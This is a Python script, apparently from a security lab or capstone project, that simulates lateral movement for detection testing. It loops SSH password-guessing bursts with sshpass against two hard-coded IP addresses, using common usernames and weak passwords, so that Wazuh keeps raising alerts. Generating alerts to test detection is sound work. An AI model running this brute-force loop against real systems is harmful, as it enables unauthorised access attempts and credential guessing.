#!/usr/bin/env python3
"""
Simulador de movimiento lateral — genera alertas SSH continuas en los nodos víctima.

Modo continuo: mantiene alertas frescas dentro de la ventana temporal del motor.
  Ciclo: victim-c (B) → pausa → capstone (C) → pausa → repite

Ctrl+C para detener.
"""

import subprocess
import time

VICTIM_C  = "165.227.122.79"
CAPSTONE  = "198.199.71.219"

USERS     = ["root", "admin", "ubuntu", "user", "test"]
PASSWORDS = ["123456", "password", "admin", "letmein", "qwerty",
             "toor", "test", "12345678", "abc123", "pass"]

# Segundos entre intentos individuales — más rápido = más alertas por minuto
DELAY = 0.15


def ssh_attempt(host: str, user: str, password: str) -> None:
    subprocess.run(
        [
            "sshpass", "-p", password,
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=3",
            "-o", "BatchMode=no",
            "-o", "PasswordAuthentication=yes",
            "-o", "PubkeyAuthentication=no",
            f"{user}@{host}",
            "exit",
        ],
        capture_output=True,
        timeout=5,
    )


def burst(host: str, label: str, n: int = 20) -> None:
    """Envía n intentos rápidos al host."""
    for i in range(n):
        user = USERS[i % len(USERS)]
        pwd  = PASSWORDS[i % len(PASSWORDS)]
        try:
            ssh_attempt(host, user, pwd)
        except Exception:
            pass
        time.sleep(DELAY)


def main():
    print("=" * 55)
    print("  Simulador de Movimiento Lateral — Modo Continuo")
    print("=" * 55)
    print("\nGenerará alertas SSH en loop para mantener scores activos.")
    print("El motor de gradiente debe estar corriendo en otra terminal.\n")
    print("Ciclo: 20 intentos → victim-c | 30s pausa | 20 intentos → capstone")
    print("Ctrl+C para detener.\n")

    cycle = 0
    try:
        while True:
            cycle += 1
            print(f"[Ciclo {cycle}] Atacando victim-c (B)...", end=" ", flush=True)
            burst(VICTIM_C, "victim-c", n=20)
            print("listo")

            print(f"[Ciclo {cycle}] Pausa 30s (Wazuh procesa alertas)...")
            time.sleep(30)

            print(f"[Ciclo {cycle}] Atacando capstone (C)...", end=" ", flush=True)
            burst(CAPSTONE, "capstone", n=20)
            print("listo")

            print(f"[Ciclo {cycle}] Pausa 30s...\n")
            time.sleep(30)

    except KeyboardInterrupt:
        print("\n[!] Simulación detenida.")


if __name__ == "__main__":
    main()
